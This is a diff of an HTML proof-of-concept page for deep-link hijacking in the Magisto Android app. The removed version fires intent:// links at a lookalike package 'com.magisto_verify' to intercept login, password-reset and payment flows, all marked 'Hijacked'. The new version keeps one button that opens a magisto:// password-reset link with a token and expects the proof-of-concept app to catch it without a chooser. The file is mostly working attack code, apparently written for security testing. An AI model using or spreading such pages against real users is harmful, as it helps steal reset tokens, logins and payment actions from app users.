@@ -1,85 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Magisto Deep Link Security Test</title>
+    <title>Magisto Test</title>
     <style>
-        body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; }
-        .button { 
+        body { 
+            font-family: Arial, sans-serif; 
+            max-width: 400px; 
+            margin: 50px auto; 
+            padding: 20px;
+            text-align: center;
+        }
+        .test-button { 
             background: #080844; 
             color: white; 
-            padding: 15px 25px; 
+            padding: 20px 30px; 
             border: none; 
-            border-radius: 5px; 
+            border-radius: 10px; 
             cursor: pointer; 
-            margin: 10px;
-            width: 90%;
-            text-align: left;
+            font-size: 18px;
+            margin: 20px 0;
+            width: 100%;
         }
-        .button:hover { background: #0d0d5e; }
-        .section { border: 1px solid #ddd; padding: 20px; margin: 20px 0; border-radius: 5px; }
-        .status { margin-top: 10px; padding: 10px; background: #f0f0f0; border-radius: 5px; font-size: 14px; }
-        .icon { margin-right: 10px; }
+        .test-button:hover { 
+            background: #0d0d5e; 
+        }
+        .status {
+            padding: 15px;
+            background: #f5f5f5;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
-    <h1>🔗 Magisto Deep Link Security Test</h1>
+    <h1>🔗 Magisto Test</h1>
     
-    <div class="section">
-        <h3>Test 1: Authentication Hijack</h3>
-        <button class="button" onclick="triggerLoginIntercept()">
-            <span class="icon">🔓</span>Trigger Login Deep Link
-        </button>
-        <div class="status" id="status1">Ready - /account/login (Hijacked)</div>
+    <div class="status">
+        <strong>Test:</strong> Password Reset Hijack<br>
+        <strong>Expected:</strong> POC app opens directly (no chooser)
     </div>
 
-    <div class="section">
-        <h3>Test 2: Password Reset Hijack</h3>
-        <button class="button" onclick="triggerPasswordReset()">
-            <span class="icon">🔑</span>Trigger Password Reset
-        </button>
-        <div class="status" id="status2">Ready - /reset/password (Hijacked)</div>
-    </div>
+    <button class="test-button" onclick="testDeepLink()">
+        🔑 Test Password Reset
+    </button>
 
-    <div class="section">
-        <h3>Test 3: Payment Flow Hijack</h3>
-        <button class="button" onclick="triggerPaymentIntercept()">
-            <span class="icon">💳</span>Trigger Payment Flow
-        </button>
-        <div class="status" id="status3">Ready - /payment/confirm (Hijacked)</div>
-    </div>
-
-    <div class="section">
-        <h3>Test 4: Legitimate Paths (Shows Chooser)</h3>
-        <button class="button" onclick="triggerPremiumUpgrade()">
-            <span class="icon">⭐</span>Premium Upgrade
-        </button>
-        <div class="status" id="status4">Ready - /account/premium (Legitimate)</div>
+    <div class="status">
+        <strong>URL:</strong><br>
+        <code>magisto://www.magisto.com/reset/password?token=test123</code>
     </div>
 
     <script>
-        function updateStatus(testNum, message) {
-            document.getElementById('status' + testNum).innerHTML = message;
-        }
-
-        function triggerLoginIntercept() {
-            updateStatus(1, "Triggering login intercept...");
-            // Use Intent URL format
-            window.location.href = "intent://www.magisto.com/account/login?email=user@example.com#Intent;scheme=magisto;package=com.magisto_verify;end;";
-        }
-
-        function triggerPasswordReset() {
-            updateStatus(2, "Triggering password reset intercept...");
-            window.location.href = "intent://www.magisto.com/reset/password?token=abc123xyz#Intent;scheme=magisto;package=com.magisto_verify;end;";
-        }
-
-        function triggerPaymentIntercept() {
-            updateStatus(3, "Triggering payment intercept...");
-            window.location.href = "intent://www.magisto.com/payment/confirm?amount=49.99#Intent;scheme=magisto;package=com.magisto_verify;end;";
-        }
-
-        function triggerPremiumUpgrade() {
-            updateStatus(4, "Triggering premium upgrade...");
-            window.location.href = "intent://www.magisto.com/account/premium?feature=4k#Intent;scheme=magisto;package=com.magisto_verify;end;";
+        function testDeepLink() {
+            console.log('Testing deep link...');
+            window.location.href = 'magisto://www.magisto.com/reset/password?token=test123';
         }
     </script>
 </body>
